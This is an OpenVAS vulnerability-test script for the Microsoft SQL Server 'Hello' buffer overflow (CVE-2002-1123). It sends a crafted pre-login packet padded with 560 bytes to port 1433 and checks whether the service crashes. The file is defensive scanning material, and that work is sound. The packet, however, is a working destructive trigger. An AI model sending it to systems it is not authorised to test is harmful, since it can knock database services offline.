##############################################################################
# OpenVAS Vulnerability Test
#
# Microsoft's SQL Hello Overflow
#
# Authors:
# Dave Aitel
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID
#
# Copyright:
# Copyright (C) 2002 Dave Aitel
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
##############################################################################

# nb: CPE is usually something like cpe:/a:microsoft:sql_server:2014, cpe:/a:microsoft:sql_server:2019 etc.
CPE_PREFIX = "cpe:/a:microsoft:sql_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11067");
  script_version("2022-12-05T10:11:03+0000");
  script_cve_id("CVE-2002-1123");
  script_xref(name:"IAVA", value:"2002-B-0007");
  script_tag(name:"last_modification", value:"2022-12-05 10:11:03 +0000 (Mon, 05 Dec 2022)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Microsoft SQL Server (MSSQL) Hello Overflow Vulnerability (Q316333)");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("Copyright (C) 2002 Dave Aitel");
  script_family("Databases");
  script_dependencies("mssqlserver_detect.nasl");
  script_require_ports("Services/mssql", 1433);
  script_mandatory_keys("microsoft/sqlserver/tcp_listener/detected");

  script_xref(name:"URL", value:"http://support.microsoft.com/default.aspx?scid=kb;en-us;Q316333&sd=tech");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/5411");

  script_tag(name:"summary", value:"Microsoft SQL Server (MSSQL) is prone to a hello overflow
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted SQL request and checks if the remote service
  is still available afterwards.");

  script_tag(name:"impact", value:"An attacker may use this flaw to execute commands against the
  remote host as LOCAL/SYSTEM, as well as read your database content.");

  script_tag(name:"solution", value:"Install Microsoft Patch Q316333 or disable the Microsoft SQL
  Server service or use a firewall to protect the MS SQL port (1433).");

  script_tag(name:"qod", value:"30"); # might result in false positives, also version reached EOL
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");

if(!infos = get_app_port_from_cpe_prefix(cpe:CPE_PREFIX, service:"mssql"))
  exit(0);

port = infos["port"];
CPE = infos["cpe"];

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

if(!soc = open_sock_tcp(port))
  exit(0);

# nb: taken from mssql.spk
pkt_hdr = raw_string(
  0x12, 0x01, 0x00, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x15, 0x00, 0x06, 0x01, 0x00, 0x1b,
  0x00, 0x01, 0x02, 0x00, 0x1c, 0x00, 0x0c, 0x03, 0x00, 0x28, 0x00, 0x04, 0xff, 0x08, 0x00, 0x02,
  0x10, 0x00, 0x00, 0x00
);

# nb: taken from mssql.spk
pkt_tail = raw_string(
  0x00, 0x24, 0x01, 0x00, 0x00
);

# nb: Use this request what normally happens
#attack_string = "MSSQLServer";

# nb: Use this request to actually test for the overflow
attack_string = crap(560);

sql_packet = string(pkt_hdr, attack_string, pkt_tail);

send(socket:soc, data:sql_packet);
r = recv(socket:soc, length:4096);
close(soc);

if(!r) {
  security_message(port:port);
  exit(0);
}

exit(99);
